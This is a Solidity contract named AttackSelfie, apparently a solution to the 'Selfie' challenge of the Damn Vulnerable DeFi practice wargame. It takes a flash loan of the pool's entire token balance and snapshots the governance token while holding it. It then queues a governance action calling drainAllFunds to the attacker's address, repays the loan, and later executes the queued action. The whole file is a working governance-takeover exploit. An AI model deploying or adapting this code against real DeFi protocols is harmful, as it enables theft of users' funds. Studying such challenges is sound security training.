// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ISelfiePool {
    function flashLoan(uint256 borrowAmount) external;
}

interface ISimpleGovernance {
    function queueAction(address receiver, bytes calldata data, uint256 weiAmount) external returns (uint256);
    function executeAction(uint256 actionId) external payable;
}

interface IDamnValuableTokenSnapshot {
  function transfer(address to, uint256 amount) external;
  function balanceOf(address account) external returns (uint256);
  function snapshot() external returns (uint256);
}

/**
 * @title AttackSelfie
 */
contract AttackSelfie {

    ISelfiePool pool;
    ISimpleGovernance governance; 
    IDamnValuableTokenSnapshot token;
    address attacker;

    constructor(address _pool, address _governance, address _token, address _attacker) {
        pool = ISelfiePool(_pool);
        governance = ISimpleGovernance(_governance);
        token = IDamnValuableTokenSnapshot(_token);
        
        attacker = _attacker;

    }

    function run() public {
        uint256 amount = token.balanceOf(address(pool));
        pool.flashLoan(amount);
    }

    function executeAction(uint256 actionId) public {
        governance.executeAction(actionId);
    }


    function receiveTokens(address _address, uint256 amount) public {
        IDamnValuableTokenSnapshot(_address).snapshot();

        governance.queueAction(address(pool), abi.encodeWithSignature("drainAllFunds(address)", address(attacker)), 0);
        
        IDamnValuableTokenSnapshot(_address).transfer(address(pool), amount);

    }

}
